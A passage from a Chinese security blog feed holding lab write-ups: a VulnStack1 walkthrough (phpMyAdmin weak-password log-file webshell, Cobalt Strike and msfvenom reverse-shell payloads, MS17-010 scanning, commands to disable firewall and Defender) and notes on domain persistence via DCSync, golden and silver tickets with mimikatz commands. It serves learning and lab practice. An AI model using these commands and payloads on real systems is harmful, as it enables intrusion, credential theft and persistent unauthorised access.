class="line">&#125;</span><br></pre></td></tr></table></figure><p>在register这里就能指定了</p><p><img src="../images/image-20230925153806539.png" alt="image-20230925153806539"></p><p><img src="../images/image-20230925153827620.png" alt="image-20230925153827620"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在网上看文章得时候  无意中看到这个Kryo反序列化  于是就写这篇文章来学习一下&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://kaikaix.github.io/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&quot;</summary>
      
    
    
    
    
    <category term="Java" scheme="https://ke1nys.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>VulnStack1</title>
    <link href="https://ke1nys.github.io/posts/29edf1b0.html"/>
    <id>https://ke1nys.github.io/posts/29edf1b0.html</id>
    <published>2023-09-19T00:29:05.000Z</published>
    <updated>2023-09-25T07:41:06.426Z</updated>
    
    <content type="html"><![CDATA[<p>这里打这个靶机主要是为了学习一下MSF和CS的联动和使用 </p><p>搭建环境——-&gt;<a href="https://blog.csdn.net/weixin_39190897/article/details/118353886">参考文章</a></p><p>最终形成的 IP 划分情况如下：</p><div class="table-container"><table><thead><tr><th style="text-align:center">主机</th><th style="text-align:center">ip地址</th></tr></thead><tbody><tr><td style="text-align:center">Win11 物理机</td><td style="text-align:center">192.168.92.129</td></tr><tr><td style="text-align:center">Win7 外网服务器</td><td style="text-align:center">外网IP：192.168.92.128；内网IP：192.168.52.143</td></tr><tr><td style="text-align:center">Win2003 域成员主机</td><td style="text-align:center">内网IP：192.168.52.141</td></tr><tr><td style="text-align:center">Win 2008 域控主机</td><td style="text-align:center">内网IP：192.168.52.138</td></tr><tr><td style="text-align:center">kali(MSF)</td><td style="text-align:center">192.168.92.130</td></tr></tbody></table></div><p>这里的就搭建完成了</p><p>win7能ping通所有人  但是所有人ping不通win7  因为win7防火墙过滤了icmp</p><p>win2003和win2008能互相ping通</p><h2 id="外网打点getshell"><a href="#外网打点getshell" class="headerlink" title="外网打点getshell"></a>外网打点getshell</h2><p>就是访问外网服务器 </p><p><img src="../images/image-20230919084153968.png" alt="image-20230919084153968"></p><p>发现是一个php探针  如何发现下面存在一个mysql服务器的弱口令登录</p><p><img src="../images/image-20230919084258128.png" alt="image-20230919084258128"></p><blockquote><p>root/root</p></blockquote><p>然后开扫描  查找这个mysql管理后台</p><p><img src="../images/image-20230919084526500.png" alt="image-20230919084526500"></p><p>扫描发现存在phpmyadmin数据库管理后台   弱口令直接登录  <code>root/root</code></p><p><strong>phpmyadmin后台getshell的几种方法</strong></p><ul><li>select into outfile直接写入</li><li>开启全局日志getshell</li><li>使用慢查询日志getshell</li><li>使用错误日志getshell</li><li>利用PHPadmin4.8.x本地文件包含漏洞getshell</li></ul><p>这里<code>into outfile</code>使用不了  使用的时候提示报错</p><p><img src="../images/image-20230919085108292.png" alt="image-20230919085108292"></p><p>这个参数就是规定哪些路径可写的</p><p><img src="../images/image-20230919085245035.png" alt="image-20230919085245035"></p><p>说明了所有路径都不可写  于是尝试日志getshell  —-&gt;ctf常客了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;%general%&#x27; //查询日志是否开启  并且日志路径</span><br><span class="line">SET GLOBAL general_log=&#x27;on&#x27;  //将日志开启</span><br><span class="line">SET GLOBAL general_log_file=&#x27;C:/phpStudy/www/shell.php&#x27;  //设置日志路径</span><br><span class="line">SELECT &#x27;&lt;?php eval($_POST[&quot;1&quot;]);?&gt;&#x27;  //将马写入设置好的路径</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230919091138797.png" alt="image-20230919091138797"></p><p>成功进行写入 使用蚁剑进行连接</p><p>发现已经是管理员账户了  不过是本地的而已</p><p><img src="../images/image-20230919091429250.png" alt="image-20230919091429250"></p><h2 id="CS上线"><a href="#CS上线" class="headerlink" title="CS上线"></a>CS上线</h2><p>这里的话本来是想用msf的  结果老弹shell失败  说什么session无效  服了  所以就只能去弹cs了</p><p><img src="../images/image-20230919091621008.png" alt="image-20230919091621008"></p><p>服务器启动 </p><p>然后客户端连接</p><p><img src="../images/image-20230919091747685.png" alt="image-20230919091747685"></p><p>这个要自己设置好  就是服务端开启时的listener 要设置为自己的服务器地址  否则会失败</p><p><img src="../images/image-20230919091854502.png" alt="image-20230919091854502"></p><p>然后生成exe文件  通过蚁剑上传</p><p><img src="../images/image-20230919091947038.png" alt="image-20230919091947038"></p><p>执行后就可以在cs看到机器上线了</p><p><strong>(其实这里的话服务器应该时linux的 然后就开始对这个linux进行提权  然后开始域的信息收集了)</strong> ———-&gt;  通过蚁剑</p><p><img src="../images/image-20230919092359415.png" alt="image-20230919092359415"></p><p>然后wget传工具扫内网  挂隧道代理这样  不过影响不大  打这个靶机就是为了学习思路的</p><p>然后就是开始进行域的信息收集</p><blockquote><p>net view                 # 查看局域网内其他主机名<br>net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域<br>net user                 # 查看本机用户列表<br>net user /domain         # 查看域用户<br>net localgroup administrators # 查看本地管理员组（通常会有域用户）<br>net view /domain         # 查看有几个域<br>net user 用户名 /domain   # 获取指定域用户的信息<br>net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）<br>net group 组名 /domain    # 查看域中某工作组<br>net group “domain admins” /domain  # 查看域管理员的名字<br>net group “domain computers” /domain  # 查看域中的其他主机名<br>net group “domain controllers” /domain  # 查看域控制器主机名（可能有多台）</p></blockquote><p>在beacon下执行  前面要加上shell  蚁剑或者其他工具就不需要了</p><p>如果cs上线的话也是可以在beacon命令行执行的</p><p><img src="../images/image-20230919093559018.png" alt="image-20230919093559018"></p><p><img src="../images/image-20230919093642959.png" alt="image-20230919093642959"></p><p>点上面的那个瞄准按钮就能看到域内所有的主机了  </p><blockquote><p>192.168.52.143  ——&gt;是服务器内网地址</p><p>192.168.92.128 ———&gt; 是服务器外网地址</p><p>192.168.52.141 和 192.168.52.138  是内网域内主机 </p></blockquote><p>谁是域控主机还需要信息收集一下</p><p><img src="../images/image-20230919095712856.png" alt="image-20230919095712856"></p><p>OWA是域控主机  god.org是我们所处的域  那么上面的ROOT主机就是我们的普通域用户了</p><p>至此内网域信息搜集完毕，已经明确了域控主机为<code>192.168.52.138</code>，同时还存在另一台域成员<code>192.168.52.141</code>，接下来的目标就是横向渗透拿下域控！</p><h2 id="域内横向渗透"><a href="#域内横向渗透" class="headerlink" title="域内横向渗透"></a>域内横向渗透</h2><p>接下来将通过 Win7 跳板机(<strong>就是通过让服务器为跳板机</strong>)，横向渗透拿下内网域内的域成员主机和域控主机。</p><p>这里的话先让靶机弹一个<code>meterpreter</code>先    这里因为咱们的目标机器是 <code>windows</code></p><blockquote><p>use exploit/multi/handler</p><p>set payload windows/x64/meterpreter/reverse_tcp  //这里的话是看情况来定</p><p>set lhost xx.xx.xx.xx</p><p>set lport 1234</p><p>run</p></blockquote><p>然后生成exe文件  通过蚁剑进行上传到windows服务器上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.92.130 LPORT=1234 -f exe -o 3.exe</span><br></pre></td></tr></table></figure><p>然后蚁剑 ——&gt;  <code>start 3.exe</code>  开始运行  这边msf就上线了</p><p><img src="../images/image-20230919150750372.png" alt="image-20230919150750372"></p><p>上线成功</p><p>老样子知道了域内一共是存在两个机器   一个是域控主机  一个是普通用户 都是windows</p><h3 id="MSF简单模块的使用"><a href="#MSF简单模块的使用" class="headerlink" title="MSF简单模块的使用"></a>MSF简单模块的使用</h3><p>获得 MSF 的会话后即可使用 MSF 集成的诸多强大功能模块和脚本。简单演示下，如调用<code>post/windows/gather/checkvm</code>判断靶机是否属于虚拟机（检查是否进入了蜜罐）：</p><p><img src="../images/image-20230919151037655.png" alt="image-20230919151037655"></p><p>再如调用 <code>post/windows/gather/enum_applications</code>模块枚举列出安装在靶机上的应用程序：</p><p><img src="../images/image-20230919151116220.png" alt="image-20230919151116220"></p><p>这是收集的一些常用的模块</p><blockquote><p>run post/windows/gather/enum_logged_on_users        #查看登录过的用户信息</p><p>run post/windows/gather/enum_ad_groups        #查看组信息</p><p>run post/windows/gather/enum_domain        #定位域控</p><p>run post/windows/gather/enum_ad_computers        #域内所有机器</p><p>use post/windows/gather/enum_patches        #发现安装的补丁</p><p>use post/multi/recon/local_exploit_suggester        #快速识别可能被利用的漏洞</p><p>run post/windows/manage/migrate           #自动进程迁移<br> run post/windows/gather/checkvm           #查看目标主机是否运行在虚拟机上<br> run post/windows/manage/killav            #关闭杀毒软件<br> run post/windows/manage/enable_rdp        #开启远程桌面服务<br> run post/windows/manage/autoroute         #查看路由信息<br> run post/windows/gather/enum_logged_on_users    #列举当前登录的用户<br> run post/windows/gather/enum_applications       #列举应用程序<br> run post/windows/gather/credentials/windows_autologin                #抓取自动登录的用户名和密码<br> run post/windows/gather/smart_hashdump               #dump出所有用户的hash</p></blockquote><p>下次上线msf后可以进行使用</p><h3 id="MSF进行永恒之蓝攻击"><a href="#MSF进行永恒之蓝攻击" class="headerlink" title="MSF进行永恒之蓝攻击"></a>MSF进行永恒之蓝攻击</h3><p><img src="../images/image-20230919152043056.png" alt="image-20230919152043056"></p><p>发现一共是打了这些补丁  没有打永恒之蓝的补丁  于是我们就可以进行攻击  先是来查看两个主机的端口开放了没有</p><h4 id="静态路由配置"><a href="#静态路由配置" class="headerlink" title="静态路由配置"></a><strong>静态路由配置</strong></h4><p>MSF 的 autoroute 模块是 MSF 框架中自带的一个路由转发功能，实现过程是 MSF 框架在已经获取的 Meterpreter Shell 的基础上添加一条去往“内网”的路由，直接使用 MSF 去访问原本不能直接访问的内网资源，只要路由可达我们既可使用 MSF 来进行探测了</p><p><strong>首先需要使用配置静态路由：</strong></p><blockquote><h1 id="加载MSF的autoroute模块，获取当前机器的所有网段信息"><a href="#加载MSF的autoroute模块，获取当前机器的所有网段信息" class="headerlink" title="加载MSF的autoroute模块，获取当前机器的所有网段信息"></a>加载MSF的autoroute模块，获取当前机器的所有网段信息</h1><p>meterpreter &gt; run post/multi/manage/autoroute  </p><h1 id="添加目标内网路由"><a href="#添加目标内网路由" class="headerlink" title="添加目标内网路由"></a>添加目标内网路由</h1><p>meterpreter &gt; run post/multi/manage/autoroute SUBNET=192.168.52.0 ACTION=ADD</p><p>//这里填这个52段是因为这个 内网地址就是这个段的</p><p>//这里可能会失败  不过影响不大  因为这个错误说明的是已经配置好了</p></blockquote><p><img src="../images/image-20230919152522487.png" alt="image-20230919152522487"></p><p>下面那步失败就是因为第一步的时候已经添加进去了</p><h4 id="MSF内网端口扫描"><a href="#MSF内网端口扫描" class="headerlink" title="MSF内网端口扫描"></a><strong>MSF内网端口扫描</strong></h4><p>现在路由可达内网网段，可以先对内网主机进行探测。</p><p>1、先执行background 命令将当前执行的 Meterpreter 会话切换到后台（后续也可执行sessions -i 重新返回会话），然后使用 MSF 自带 <code>auxiliary/scanner/portscan/tcp</code> 模块扫描内网域成员主机 <code>192.168.52.141</code> 开放的端口：</p><blockquote><p>msf6 &gt; use auxiliary/scanner/portscan/tcp </p><p>msf6 &gt; set rhosts 192.168.52.141</p><p> msf6 &gt; set ports 80,135-139,445,3306,3389</p><p> msf6 &gt; run</p></blockquote><p><img src="../images/image-20230919152813739.png" alt="image-20230919152813739"></p><p>发现开启了445端口  于是就是去尝试是否存在永恒之蓝的这个漏洞</p><h4 id="利用ms17-010进行攻击"><a href="#利用ms17-010进行攻击" class="headerlink" title="利用ms17-010进行攻击"></a><strong>利用ms17-010进行攻击</strong></h4><p>对于开启了 445 端口的 Windows 服务器，肯定是要进行一波永恒之蓝扫描尝试的，借助 MSF 自带的漏洞扫描模块进行扫描：</p><blockquote><p>msf6 &gt; search ms17_010 #搜索MSF集成的与ms17_010漏洞相关的模块<br>msf6 &gt;use auxiliary/scanner/smb/smb_ms17_010 # 加载扫描exp<br>msf6 &gt;set rhosts 192.168.52.141 #设置被扫描的主机IP<br>msf6 &gt;run  #进行扫描，观察是否存在该漏洞</p></blockquote><p><img src="../images/image-20230919153204857.png" alt="image-20230919153204857"></p><p>同理  域控主机也是存在的</p><p>这里讲一个关闭这个防火墙和杀毒的方法</p><blockquote><p>meterpreter  —-&gt;  shell</p><p>netsh advfirewall set allprofiles state off <em>#关闭防火墙</em> </p><p>net stop windefend <em>#关闭Windows defender</em></p></blockquote><h4 id="MSF开启远程桌面"><a href="#MSF开启远程桌面" class="headerlink" title="MSF开启远程桌面"></a>MSF开启远程桌面</h4><blockquote><p>run post/windows/manage/enable_rdp</p></blockquote><p>这个指令能开启我们的跳板机的3389端口</p><p>这里的话不想往下写了   主要的目的就是为了了解一下这些工具的使用</p><p>这个靶机以后可以拿来测试一下  学到的方法</p><p><a href="https://blog.csdn.net/weixin_45588247/article/details/119497964">MSF中mimikatz的使用方法</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里打这个靶机主要是为了学习一下MSF和CS的联动和使用 &lt;/p&gt;
&lt;p&gt;搭建环境——-&amp;gt;&lt;a href=&quot;https://blog.csdn.net/weixin_39190897/article/details/118353886&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Windows域-权限维持</title>
    <link href="https://ke1nys.github.io/posts/a3cbb047.html"/>
    <id>https://ke1nys.github.io/posts/a3cbb047.html</id>
    <published>2023-09-17T08:24:08.000Z</published>
    <updated>2023-09-26T06:51:42.687Z</updated>
    
    <content type="html"><![CDATA[<p>这里的使用这个的前提就是已经拿下域控了  并且拿下管理员账户了</p><p>为了防止蓝队把我们踢出局  所以执行这个是必要的</p><h2 id="DC-Sync"><a href="#DC-Sync" class="headerlink" title="DC Sync"></a>DC Sync</h2><p><a href="https://blog.csdn.net/qq_44159028/article/details/124274233">参考文章</a></p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>DCSync是<a href="https://so.csdn.net/so/search?q=mimikatz&amp;spm=1001.2101.3001.7020">mimikatz</a>的一个功能，能够模拟域控制器并从域控制器导出帐户密码hash</p><p>在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。</p><p>DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。</p><p>新版本的 Mimikatz新增加了 DCSync 功能。该功能可以模仿一个域控制器，从真实的域控制器中请求数据，例如用户的哈希。该功能最大的特点就是可以实现不登录到域控而获取域控上的数据</p><p><strong>当获得了域内管理员权限，如果能修改域内普通用户的权限，使其具有DCSync权限的话，那么普通域用户也能导出域内用户的哈希，这样可以做一个隐蔽的权限维持</strong>。默认只有域控主机账号和域管理员能Dcsync，域管和邮件服务器的机器账号有写ACL的权限，可以给指定用户添加Dcsync来dump域哈希。</p><h3 id="利用-导出hash"><a href="#利用-导出hash" class="headerlink" title="利用(导出hash)"></a>利用(导出hash)</h3><p>导出域用户hash，需获取以下任意用户的权限：</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p><img src="../images/image-20230917163932351.png" alt="image-20230917163932351"></p><p><strong>四个用户的简介</strong></p><p>在我们拿下这个域控之后  我们就可以dump全部人的hash值了</p><p><img src="../images/image-20230917164100983.png" alt="image-20230917164100983"></p><p>这里是获取krbtgt的hash值  如果想要获取全部人的hash值得话</p><p><img src="../images/image-20230917164209206.png" alt="image-20230917164209206"></p><p>dump所有人得hash值  并且以csv的格式进行输出</p><p>其实在这里的话我们是可以在获取这个krbtgt的hash值情况下   进行创建黄金票据来注入内存  来使这台计算机具有管理员权限  这里的话就使用别的方法</p><h3 id="维持-给别的计算机添加管理员权限"><a href="#维持-给别的计算机添加管理员权限" class="headerlink" title="维持(给别的计算机添加管理员权限)"></a>维持(给别的计算机添加管理员权限)</h3><p>DCsync是几个权限的集合体，如果使其具有DCSync权限的话，可以使用powerview.ps1向域内普通用户添加如下三条ACE(Access Control Entries)：</p><p><img src="../images/image-20230917164909007.png" alt="image-20230917164909007"></p><p>在域管用户的机器上执行 给别的机器上的普通用户yuwin7添加以上三条ACE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#添加ACE</span><br><span class="line">powershell -exec bypass</span><br><span class="line">import-module .\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity “DC=test,DC=lab” -PrincipalIdentity yuwin7 -Rights DCSync -Verbose</span><br><span class="line"> </span><br><span class="line">#使用完后可以删除ACE</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity “DC=test,DC=lab” -PrincipalIdentity yuwin7 -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure><p>这里的话普通用户yuwin7就能执行管理员权限还dump出所有人的hash值了</p><h2 id="黄金票据和白银票据"><a href="#黄金票据和白银票据" class="headerlink" title="黄金票据和白银票据"></a>黄金票据和白银票据</h2><p><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/#%E9%93%B6%E7%A5%A8-SilverTickets">参考文章</a></p><p>其实这里的话在之前的几个模块就已经写过了  但是为了加深印象和总结  就重新在写一遍  加深印象</p><p><strong>在学习这两个协议之前  可以先去看看我之前写的一篇这个关于 <a href="https://ke1nys.github.io/posts/1bedf17b.html">Kerberos</a>协议的文章</strong></p><p>学习这个的前提还是得先了解<code>kerberos</code>协议的身份验证流程</p><p><img src="../images/d8b0bf2303eb0486da1737ac6a07da51.png" alt="img"></p><p><strong>然后了解一下会用到的东西</strong></p><ul><li><strong>KDC</strong>(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS</li><li><strong>AS</strong>(Authentication Server)： 身份认证服务</li><li><strong>TGS</strong>(Ticket Granting Server)： 票据授予服务</li><li><strong>TGT</strong>(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时</li><li><strong>Pass The Ticket</strong>： 如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限</li></ul><p>这里的话就不多介绍了  因为在上面给了一篇文章详细的讲了这个流程</p><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>黄金门票是伪造的TGT。这意味着我们绕过上图的步骤 1 和 2，在那里我们向 DC 证明我们是谁  <strong>可以说有了金票就有了域内的最高权限</strong></p><p> 每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，其实就可以伪造任意用户的TICKET,</p><p> 对于攻击者来说，实际上只要拿到了域控权限，就可以直接导出krbtgt的Hash值，，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。</p><p><img src="../images/2016011804523676070160.png" alt="Alt text"></p><p>这就是黄金票据和白银票据的生成过程</p><h4 id="黄金票据特点"><a href="#黄金票据特点" class="headerlink" title="黄金票据特点"></a>黄金票据特点</h4><ul><li>域控制器中的KDC服务不验证TGT中的用户帐户，直到<a href="http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html">TGT超过20分钟，</a>这意味着攻击者可以使用禁用和删除的帐户，甚至是在Active Directory中不存在的虚拟帐户。</li></ul><blockquote><p>简单点说就是我们绕过了KDC来创建TGT了  但是KDC会验证我们TGT票据里的用户是否有效  证明有效的前提就是该用户的时间戳不超过20分钟 (未被禁用、删除或不存在——-&gt; 这些用户都是符合的)</p></blockquote><ul><li>由于在域控制器上由KDC服务生成的域设置了Kerberos策略，如果提供票据，则系统信任票据的有效性。这意味着，即使域策略声明Kerberos登录票据（TGT）只有10小时有效，如果票据声明有效期为10 年，那么也会信任票据的有效性期为10年。</li><li>该<a href="http://adsecurity.org/?p=483">KRBTGT</a>帐户密码<a href="http://adsecurity.org/?p=483">从不更改*</a>和直到KRBTGT密码被更改（两次），攻击者可以创建黄金票据。<strong>请注意，即使伪造用户更改其密码，创建用于模拟用户的Golden Ticket仍然存在。</strong></li><li>它绕过了SmartCard身份验证要求，因为它绕过了DC在创建TGT之前执行的常规验证。</li><li>.这个精心创建的TGT要求攻击者拥有Active Directory域的KRBTGT密码哈希值（<a href="http://adsecurity.org/?p=451">通常从域控制器转储</a>）。</li><li>KRBTGT NTLM哈希可用于生成一个有效的TGT（使用RC4）模拟任何用户访问Active Directory中的任何资源。</li><li>在主机上都可以生成和使用黄金票据（TGT），即使没有加入域也是如此。只要网络可以访问域。</li><li>用于从AD森林中的DC获取有效的TGS票据，并提供一个坚持在一切域访问所有的主机的好办法。</li></ul><h4 id="制作条件"><a href="#制作条件" class="headerlink" title="制作条件"></a>制作条件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、域名称            </span><br><span class="line">2、域的SID值</span><br><span class="line">3、域的KRBTGT账户密码HASH</span><br><span class="line">4、伪造用户名，可以是任意的</span><br></pre></td></tr></table></figure><h4 id="制作步骤"><a href="#制作步骤" class="headerlink" title="制作步骤"></a>制作步骤</h4><h5 id="1-导出krbtgt的Hash"><a href="#1-导出krbtgt的Hash" class="headerlink" title="1.导出krbtgt的Hash"></a><strong>1.导出krbtgt的Hash</strong></h5><p>金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:za.tryhackme.loc /user:krbtgt@za.tryhackme.loc</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230918093409490.png" alt="image-20230918093409490"></p><h5 id="2-生成Golden-Ticket"><a href="#2-生成Golden-Ticket" class="headerlink" title="2.生成Golden Ticket"></a><strong>2.生成Golden Ticket</strong></h5><p> 得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/admin：伪造的用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt的HASH值</span><br><span class="line">/ticket：生成的票据名称</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /ticket:golden.kiribi</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230918093717184.png" alt="image-20230918093717184"></p><h5 id="3-导入伪造Golden-Ticket获得域控权限"><a href="#3-导入伪造Golden-Ticket获得域控权限" class="headerlink" title="3. 导入伪造Golden Ticket获得域控权限"></a><strong>3. 导入伪造Golden Ticket获得域控权限</strong></h5><p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt golden.kiribi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230918093932637.png" alt="image-20230918093932637"></p><p>这样成功伪造这台计算机的本地管理员用户了  然后以后这台计算机登录的任何用户都获得这个本地管理员的权限  因为已经注入到内存中了</p><p>此时就可以通过dir成功访问域控的共享文件夹。</p><p><img src="../images/image-20230918094149486.png" alt="image-20230918094149486"></p><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul><li><strong>这种方式导入的Ticket默认在20分钟以内生效，如果过期了，再次ptt导入Golden Ticket即可。</strong></li><li>可以伪造任意用户，即使其不存在。</li><li>krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码。</li></ul><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p> Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值） <strong>就是说计算机已经固定了</strong>，所以银票只能访问指定服务。</p><p>银票是伪造的TGS门票。所以现在，我们跳过了与 DC 上的 K DC 进行的所有通信（上图中的步骤 1-4），只与我们希望直接访问的服务进行接口</p><p>这里的话我在这个 <a href="https://ke1nys.github.io/posts/1bedf17b.html">Kerberos协议中</a> 已经详细的介绍了  和黄金票据一样  先去了解一下</p><p><img src="../images/image-20230918094901060.png" alt="image-20230918094901060"></p><p><strong>白银票据认证流程</strong></p><p><img src="../images/20160118045256924591213.png" alt="Alt text"></p><h4 id="白银票据特点"><a href="#白银票据特点" class="headerlink" title="白银票据特点"></a>白银票据特点</h4><ul><li>.白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</li><li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。</li><li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li><li>攻击者需要服务帐户密码哈希值</li><li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过。</li><li>任何事件日志都在目标服务器上。</li></ul><h4 id="制作条件-1"><a href="#制作条件-1" class="headerlink" title="制作条件"></a>制作条件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.域名称</span><br><span class="line">2.域的SID值</span><br><span class="line">3.域中的Server服务器账户的NTLM-Hash</span><br><span class="line">4.伪造的用户名，可以是任意用户名.</span><br><span class="line">5.目标服务器上面的kerberos服务</span><br></pre></td></tr></table></figure><h4 id="白银票据的服务列表"><a href="#白银票据的服务列表" class="headerlink" title="白银票据的服务列表"></a>白银票据的服务列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">服务名称                    同时需要的服务</span><br><span class="line">WMI                        HOST、RPCSS</span><br><span class="line">PowerShell Remoting        HOST、HTTP</span><br><span class="line">WinRM                    HOST、HTTP</span><br><span class="line">Scheduled Tasks            HOST</span><br><span class="line">Windows File Share        CIFS</span><br><span class="line">LDAP                    LDAP</span><br><span class="line">Windows Remote Server    RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure><h4 id="制作步骤-1"><a href="#制作步骤-1" class="headerlink" title="制作步骤"></a>制作步骤</h4><h5 id="1-获取hash-sid等信息"><a href="#1-获取hash-sid等信息" class="headerlink" title="1.获取hash sid等信息"></a>1.获取hash sid等信息</h5><p>首先我们需要知道服务账户的密码HASH  这里我们获取的不是本地计算机的hash值  我们获取的是这台计算机的hash值</p><p><img src="../images/image-20230918100049041.png" alt="image-20230918100049041"></p><h5 id="2-伪造白银票据"><a href="#2-伪造白银票据" class="headerlink" title="2.伪造白银票据"></a>2.伪造白银票据</h5><p>这时得到了THMWRK1$的HASH值，通过mimikatz生成银票。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/domain：当前域名称</span><br><span class="line">/sid：SID值，和金票一样取前面一部分</span><br><span class="line">/target：目标主机，这里是thmwrk1.za.tryhackme.loc</span><br><span class="line">/service：服务名称，这里需要访问共享文件，所以是cifs</span><br><span class="line">/rc4：目标主机的HASH值</span><br><span class="line">/user：伪造的用户名</span><br><span class="line">/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:thmwrk1.za.tryhackme.loc /service:cifs /rc4:c19d46ece8776ef0c4697daad3b6b13f /user:silver /ptt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230918100440838.png" alt="image-20230918100440838"></p><p>这样的话我们就可以访问这个DC的共享文件夹了</p><p><img src="../images/image-20230918100740794.png" alt="image-20230918100740794"></p><p>这里我们只是伪造了这个<code>cifs</code>(<strong>DC共享文件夹访问权限</strong>)    其实上面还给了好几种访问  我们也是可以进行伪造的</p><h4 id="各种服务中的示例"><a href="#各种服务中的示例" class="headerlink" 